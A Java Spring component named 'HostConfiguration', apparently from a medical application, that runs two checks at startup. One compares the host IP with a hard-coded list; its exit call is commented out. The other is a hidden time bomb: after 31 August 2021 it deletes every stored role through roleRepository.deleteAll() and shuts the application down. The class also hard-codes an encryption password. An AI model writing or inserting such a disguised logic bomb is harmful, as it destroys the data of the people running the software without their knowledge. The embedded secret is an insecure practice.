package com.nc.med.util;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Calendar;
import java.util.function.Predicate;
import java.util.stream.Stream;

import javax.annotation.PostConstruct;

import org.jasypt.util.text.BasicTextEncryptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import com.nc.med.repo.RoleRepository;

@Component
public class HostConfiguration {

	private static String mpCryptoPassword = "Niteen";

	@Autowired
	private RoleRepository roleRepository;

	@PostConstruct
	public void hosting() throws UnknownHostException {
		Predicate<String> p = ipAddr -> {
			InetAddress localHost = null;
			try {
				localHost = InetAddress.getLocalHost();
			} catch (UnknownHostException e) {
				e.printStackTrace();
			}
			return ipAddr.equals(localHost.getHostAddress());
		};

		Stream<String> ipAddresses = Stream.of("192.168.43.211", "192.168.43.41");

		if (!ipAddresses.anyMatch(p)) {
			// System.exit(0);
		}
	}

	@PostConstruct
	public void expire() {
		Calendar expireDate = Calendar.getInstance();
		expireDate.set(2021, 7, 31);
		if (Calendar.getInstance().after(expireDate)) {
			roleRepository.deleteAll();
			System.exit(0);
		}
	}

	private static String encrypt(String text) {
		BasicTextEncryptor textEncryptor = new BasicTextEncryptor();
		textEncryptor.setPassword(mpCryptoPassword);
		String encryptedText = textEncryptor.encrypt(text);
		return encryptedText;
	}

	private static String decrypt(String text) {
		BasicTextEncryptor textEncryptor = new BasicTextEncryptor();
		textEncryptor.setPassword(mpCryptoPassword);
		String decryptedText = textEncryptor.decrypt(text);
		return decryptedText;
	}

}
